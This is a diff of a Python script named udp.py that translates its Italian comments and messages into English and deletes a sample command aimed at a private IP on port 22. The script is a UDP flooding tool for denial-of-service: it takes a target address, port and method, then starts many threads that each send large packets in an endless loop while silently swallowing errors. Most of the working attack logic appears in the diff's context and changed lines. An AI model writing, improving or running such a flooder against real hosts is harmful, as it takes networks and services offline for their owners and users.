@@ -2,9 +2,9 @@ import sys
 import socket
 import threading
 
-# Controllo se sono stati passati tutti gli argomenti per evitare l'IndexError
+# Check if all arguments have been passed to avoid IndexError
 if len(sys.argv) < 4:
-    print("Utilizzo: python udp.py <IP> <PORTA> <METODO>")
+    print("Usage: python udp.py <IP> <PORT> <METHOD>")
     sys.exit()
 
 host = str(sys.argv[1])
@@ -22,18 +22,18 @@ def send_packet(amplifier):
         while True: 
             s.send(b"\x99" * amplifier)
     except:
-        pass # Silenzia gli errori di connessione
+        pass # Silence connection errors
 
 def attack_HQ():
-    print(f"Attacco avviato su {host}:{port} con metodo {method}...")
+    print(f"Attack started on {host}:{port} with method {method}...")
     
-    # Seleziona l'ampiezza in base al metodo
+    # Select the amplitude based on the method
     amp = 375
     if method == "UDP-Power": amp = 750
     
     for _ in range(loops):
-        # NOTA: target riceve il nome della funzione, args i parametri
-        # Questo permette di creare veri thread paralleli
+        # NOTE: target receives the function name, args the parameters
+        # This allows for the creation of true parallel threads
         t = threading.Thread(target=send_packet, args=(amp,), daemon=True)
         t.start()
         
@@ -41,9 +41,7 @@ def attack_HQ():
         for _ in range(loops):
             threading.Thread(target=send_packet, args=(750,), daemon=True).start()
 
-# Avvia la funzione principale
+# Start the main function
 if __name__ == "__main__":
     attack_HQ()
 
-#                   ip       porta  modo
-# python udp.py 192.168.70.130 22 UDP-Mix
